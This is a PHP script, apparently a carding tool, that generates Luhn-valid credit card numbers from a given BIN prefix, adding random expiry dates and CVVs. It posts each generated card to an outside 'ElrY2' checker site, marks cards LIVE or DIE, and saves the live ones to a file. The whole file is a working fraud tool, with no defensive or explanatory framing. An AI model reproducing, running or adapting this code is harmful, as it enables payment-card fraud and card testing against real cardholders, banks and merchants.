<?php
class creditCardGenerator
{
    protected $bin;
    protected $message;
    protected $much;
    protected $check;
    
    public function color($color = "default" , $text){
    	$arrayColor = array(
    		'grey' 		=> '1;30',
    		'red' 		=> '1;31',
    		'green' 	=> '1;32',
    		'yellow' 	=> '1;33',
    		'blue' 		=> '1;34',
    		'purple' 	=> '1;35',
    		'nevy' 		=> '1;36',
    		'white' 	=> '1;0',
    	);	
    	return "\033[".$arrayColor[$color]."m".$text."\033[0m";
    }
    public function __construct($bin, $much, $check){
        $this->bin = $bin;
        $this->check = $check;
        if (is_numeric($check)) {
            $this->check = $check;
        }else{
            echo $this->color("red", "{!} Check must boolean\n");
        }
        if (is_numeric($much)) {
            $this->much = $much;
        } else {   
            echo $this->color("red", "{!} Total must be numeric!\n");
            exit(1);
        }
    }
    protected function Save($title, $text){
        $fopen = fopen($title, "a");
        fwrite($fopen, $text);
        fclose($fopen);
    }
    protected function Check($card){
        $ch = curl_init();
        $postData = http_build_query(
                        array(
                                "data" => $card
                            )
                    );
        $headers = array();
        $headers[] = 'Accept-Language: en-US,en;q=0.9';
        $headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36';
        $headers[] = 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8';
        $headers[] = 'Accept: */*';
        $headers[] = 'Referer: http://elry2cc.com/ElrY2_Checker/';
        $headers[] = 'X-Requested-With: XMLHttpRequest';
        $headers[] = 'Connection: keep-alive';
        $options = array(
                        CURLOPT_URL => 'http://elry2cc.com/ElrY2_Checker/api.php',
                        CURLOPT_RETURNTRANSFER => true,
                        CURLOPT_POST => true, 
                        CURLOPT_POSTFIELDS => $postData,
                        CURLOPT_HTTPHEADER => $headers,
                        CURLOPT_FOLLOWLOCATION => true
                );
        curl_setopt_array($ch, $options);
        $exec = curl_exec($ch);
        return $exec;
    }
    public function getCC() 
    {
        if (($this->bin <= 0) || !isset($this->bin)) {
            $message[0] = 'Set bin first';
            echo $this->color("yellow", $message);
        } else if ($this->bin > 9999999999999999) {
            $message[0] = 'Bin to long';
            echo $this->color("yellow", $message);
        } else {
            $output = $this->ccNumber($this->bin, 16, $this->much);
            return $output;
        }
    }
    protected function generateYears(){
        $randDate = rand(1,30);
        $randYears = rand(20,25);
        $randCvv = rand(010, 800);
        $randDate < 10 ? $randDate = "0".$randDate : $randDate = $randDate;
        $randCvv < 100 ? $randCvv = "0".$randCvv : $randCvv = $randCvv;
        return "|".$randDate."|20".$randYears."|".$randCvv;
    }
    protected function completedNumber($prefix, $length)
    {
        $ccnumber = $this->bin;
    
        while ( strlen($ccnumber) < ($length - 1) ) {
            $ccnumber .= rand(0,9);
        }
    
        # Calculate sum
        $sum = 0;
        $pos = 0;
        $reversedCCnumber = strrev( $ccnumber );
    
        while ( $pos < $length - 1 ) {
            $odd = $reversedCCnumber[ $pos ] * 2;
            if( $odd > 9 ) {
                $odd -= 9;
            }
            $sum += $odd;
    
            if( $pos != ($length - 2) ) {
    
                $sum += $reversedCCnumber[ $pos +1 ];
            }
            $pos += 2;
        }
    
        # Calculate check digit
        $checkdigit = (( floor($sum/10) + 1) * 10 - $sum) % 10;
        $ccnumber .= $checkdigit;
        return $ccnumber;
    }
    
    
    protected function ccNumber($prefixList, $length, $howMany) 
    {
        for ($i = 0; $i < $howMany; $i++) {
            if ($this->check == true) {
                $card = $this->completedNumber($this->bin, $length).$this->generateYears();
                $check = json_decode($this->Check($card));
                if ($check->error == 1){
                    echo $card.$this->color("green", " >> LIVE\n");
                    $this->Save("Result-".$this->bin.".txt", $card."\n");
                }else if ($check->error == 2){
                    echo $card.$this->color("red", " >> DIE\n");
                }else if ($check->error == 3){
                    echo $card.$this->color("grey", " >> UNKNOWN\n");
                }else{
                    echo $card.$this->color("yellow", " >> CC NOT VALID\n");
                }
            } else {
                echo $this->completedNumber($this->bin, $length).$this->generateYears()."\n";
            }
        }
    }

}
